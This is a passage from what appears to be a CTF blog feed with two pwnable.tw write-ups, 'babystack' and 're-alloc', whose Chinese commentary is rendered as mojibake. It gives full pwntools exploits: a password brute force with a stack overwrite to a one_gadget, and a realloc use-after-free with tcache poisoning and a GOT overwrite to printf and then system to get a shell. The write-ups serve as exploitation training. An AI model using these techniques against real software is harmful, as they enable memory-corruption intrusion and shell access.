50</span><br><span class="line">00:0000â”‚ rsp  0x7ffc3b4fb510 â—‚â€” 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">07:0038â”‚      0x7ffc3b4fb548 â—‚â€” 0x3161616161616161 (&#x27;aaaaaaa1&#x27;)</span><br><span class="line">08:0040â”‚      0x7ffc3b4fb550 â—‚â€” 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">0a:0050â”‚ rsi  0x7ffc3b4fb560 â—‚â€” 0x7fac80980a31</span><br><span class="line">0b:0058â”‚      0x7ffc3b4fb568 â—‚â€” 0x0</span><br><span class="line">0c:0060â”‚ rbp  0x7ffc3b4fb570 â€”â–¸ 0x55c28958a060 â—‚â€” 0x41ff894156415741</span><br></pre></td></tr></table></figure><p>0x7fac80980a31è¿™ä¸ªåœ°å€çœ‹ç€åƒLibcé‡Œçš„ï¼Œä½†å®é™…ä¸Šä»–å’ŒLibcçš„åç§»æ˜¯ä¸å›ºå®šçš„ã€‚</p><p>ä¸‡äº‹å…·å¤‡äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åœ¨loginæ—¶æ„é€ å¥½stackï¼Œåœ¨copyé‡Œæ‰§è¡Œstrcpyæ—¶å°†æ­£ç¡®çš„passwordå†™å…¥å¯¹åº”ä½ç½®ï¼ˆé€€å‡ºæ—¶ä¼šå’Œbssä¸Šå¤‡ä»½çš„æ¯”è¾ƒï¼‰ï¼Œå¹¶æ”¹ret_addrä¸ºone_gadgetğŸš©</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>(<span class="params"><span class="built_in">len</span>, flag=<span class="literal">False</span></span>):</span><br><span class="line">    secret=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1</span>,<span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> j == <span class="number">0x10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Your passowrd :&quot;</span>)</span><br><span class="line">            temp = secret+<span class="built_in">chr</span>(j)+<span class="string">&quot;\x00&quot;</span></span><br><span class="line">            p.sendline(temp)</span><br><span class="line">            recv = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Success&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">                secret += <span class="built_in">chr</span>(j)</span><br><span class="line">                log.success(<span class="string">&quot;password: &quot;</span>+secret)</span><br><span class="line">                p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">                p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./babystack&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc_64.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret=get_password(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># debug(0x000000FA6)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;1&#x27;</span>*(<span class="number">47</span>+<span class="number">32</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x3f</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">guess=<span class="string">&#x27;1&#x27;</span>*<span class="number">0x11</span>+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;1&#x27;</span>*<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1</span>,<span class="number">0x100</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        p.send(guess+<span class="built_in">chr</span>(i)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        recv=p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Success&#x27;</span> <span class="keyword">in</span> recv:</span><br><span class="line">            guess+=<span class="built_in">chr</span>(i)</span><br><span class="line">            success(<span class="string">&quot;guess: &quot;</span>+guess)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">libc.address=u64(guess[<span class="number">24</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x06ffb4</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">one_gadget=libc.address+<span class="number">0xf0567</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x3f</span>+secret+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(one_gadget))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x3f</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc_64.so.6&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw re-alloc</title>
      <link href="/2020/10/19/Pwnable_re-alloc/"/>
      <url>/2020/10/19/Pwnable_re-alloc/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwmable-tw-Re-alloc"><a href="#Pwmable-tw-Re-alloc" class="headerlink" title="Pwmable.tw Re-alloc"></a>Pwmable.tw Re-alloc</h3><blockquote><p>åˆ©ç”¨æ€è·¯æŒºæ–°å¥‡çš„ï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ğŸ¤™</p></blockquote><span id="more"></span><p>å…¸å‹èœå•é¢˜ï¼Œä½†libcç‰ˆæœ¬ä¸º2.29ï¼Œæ„å‘³ç€tecacheé‡Œé¢0x8çš„ä½ç½®ä¼šæ”¾å…¥keyæŒ‡å‘tecache_structï¼Œè‹¥è¦æƒ³double freeï¼Œåªèƒ½æ”¹æ‰keyå€¼ã€‚</p><p>addå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  idx = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">1</span> || heap[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">    size = read_long();</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">realloc</span>(<span class="number">0LL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        heap[idx] = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">        v0 = (_BYTE *)(heap[idx] + read_input(heap[idx], size));</span><br><span class="line">        *v0 = <span class="number">0</span>;                                <span class="comment">// off_by_one</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åªå…è®¸ç”³è¯·ä¸¤ä¸ªå‡½æ•°ï¼Œoff_by_oneæ„Ÿè§‰ç”¨ä¸äº†äº†ã€‚</p><p>deleå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">v2 = read_long();</span><br><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">realloc</span>((<span class="type">void</span> *)heap[v2], <span class="number">0LL</span>);</span><br><span class="line">  v0 = heap;</span><br><span class="line">  heap[v2] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ²¡æœ‰é‡æŒ‡é’ˆï¼Ÿ</p><p>editå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">v1 = read_long();</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> || !heap[v1] )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">size = read_long();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">v3 = <span class="built_in">realloc</span>((<span class="type">void</span> *)heap[v1], size);</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">heap[v1] = v3;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> read_input(heap[v1], size);</span><br></pre></td></tr></table></figure><p>è¿™ä¸€éçœ‹ä¸‹æ¥å‘ç°éƒ½æ˜¯åˆ©ç”¨reallocå‡½æ•°æ¥å®Œæˆå„ç§æ“ä½œï¼Œè¿™é‡Œå¯¹reallocè¿›è¡Œä¸€ä¸ªè¯´æ˜ï¼š</p><p>reallocç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªæŒ‡é’ˆptrï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºsizeã€‚<br>å½“ptr&#x3D;NULLæ—¶ç›¸å½“äºmalloc(size)<br>å½“pträ¸ä¸ºnullï¼Œä¸”sizeä¸ä¸º0æ—¶ï¼Œå…ˆmalloc(size)ï¼Œå†æŠŠptré‡Œçš„å†…å®¹æ‹·è´åˆ°æ–°å†…å­˜é‡Œï¼ˆsizeå¤§äºold_sizeï¼Œæ‰©å®¹ï¼›sizeå°äºold_szieï¼Œåˆ‡å‰²ï¼‰ã€‚<br>å½“pträ¸ä¸ºnullï¼Œsize&#x3D;0æ—¶ï¼Œç›¸å½“äºfree(ptr)ã€‚</p><p>å› æ­¤å¯ä»¥æƒ³åˆ°editå‡½æ•°é‡Œçš„reallocå‡½æ•°çš„sizeæ˜¯ç”±æˆ‘ä»¬çš„è¾“å…¥å†³å®šçš„ï¼Œå¦‚æœsizeä¸º0ï¼Œåˆ™free(ptr)ï¼Œå½¢æˆUAFğŸˆ</p><p>ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜åœ¨äºæ²¡æœ‰showå‡½æ•°ï¼Œè€Œä¸”åªæœ‰2ä¸ªèƒ½ç”¨çš„å †å—æ˜¯æ— æ³•å®ç°å¯¹stdoutçš„åŠ«æŒçš„ã€‚ã€‚</p><p>è¿™é“é¢˜æä¾›äº†ä¸€ä¸ªæ–°çš„æ€è·¯ï¼šæ”¹å†™atoll_gotä¸ºprintf_pltï¼Œæ„é€ fmtæ³„éœ²ã€‚</p><p>ç”±äºatollå‚æ•°ä¸º&amp;bufï¼Œæ”¹ä¸ºprintfçš„è¯è‡ªç„¶å½¢æˆfmtï¼Œå¾ˆå¦™ã€‚</p><p>é‚£æ¥ä¸‹æ¥å°±æ˜¯æ¼æ´åˆ©ç”¨äº†ï¼Œå…ˆuafæ”¹fdä¸ºatoll_gotï¼Œä¹‹åadd,è¿™æ ·chunk0&#x3D;chunk1(0x20)ï¼Œä¸”tecacheçš„0x20ä¸Šæ®‹ç•™äº†ä¸€ä¸ªatoi_gotçš„åœ°å€ã€‚ç„¶åedit chunk0ä¸ºè¾ƒå¤§çš„sizeï¼Œå¹¶dele(0)ï¼ŒåŒæ—¶edit chunk1å’Œchunk0ç›¸ç­‰çš„sizeï¼ŒåŒæ—¶è¦†ç›–key(ä¸ç„¶dele(1)æ—¶ä¼šæŠ¥é”™)ï¼Œä¹‹ådele(1),è¿™æ ·ä¸€ä¸ªæµç¨‹ä¸‹æ¥å°±ä½¿å¾—å³åœ¨0x20çš„tecache binä¸Šç•™ä¸‹åœ°å€ï¼Œåˆæ¸…ç©ºäº†ä¸¤ä¸ªå †ã€‚</p><p>é‡å¤ä¸Šé¢çš„æµç¨‹ä½¿å¾—åœ¨tecacheçš„å¤šä¸ªsizeé“¾ä¸Šç•™ä¸‹atoll_gotï¼Œæ–¹ä¾¿åé¢çš„åˆ©ç”¨ã€‚</p><p>ä¹‹åå°±æ˜¯ä¿®æ”¹atoll_gotä¸ºprintf_plt(æœ€å¥½ä¸è¦ç”¨0x20çš„é‚£ä¸ªatoll_got)ï¼Œä»è€Œleakã€‚</p><p>leakå®Œåç”±äºatollè¢«æ”¹æˆäº†printfï¼Œä½¿å¾—æˆ‘ä»¬åœ¨addæ—¶çš„è¾“å…¥è¦æœ‰æ‰€å˜åŒ–ï¼Œåˆ©ç”¨printfçš„è¿”å›å€¼ä¸ºè¾“å‡ºçš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œæˆ‘ä»¬é€šè¿‡add(â€˜aâ€™+â€™\0â€™,â€™aâ€™*0x10+â€™\0â€™)æ¥ç”³è¯·å‡º0x20å¤§å°çš„tecache binï¼Œæ”¹atoll_gotä¸ºsystemæ‹¿åˆ°shellğŸš©</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line"><span class="comment"># p=process(&quot;./re-alloc&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so&#x27;&#125;)</span></span><br><span class="line">p=process([<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so&quot;</span>,<span class="string">&quot;./re-alloc&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;</span>&#125;)</span><br><span class="line">elf=ELF(<span class="string">&quot;./re-alloc&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10106</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,data</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,sz,data</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line"><span class="keyword">if</span> sz!=<span class="number">0</span>:</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0x404048</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x38</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0x404048</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x58</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x58</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0x00401070</span>))</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%p-%p+%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x12e009</span></span><br><span class="line">info(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">15</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">p.send(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment"># 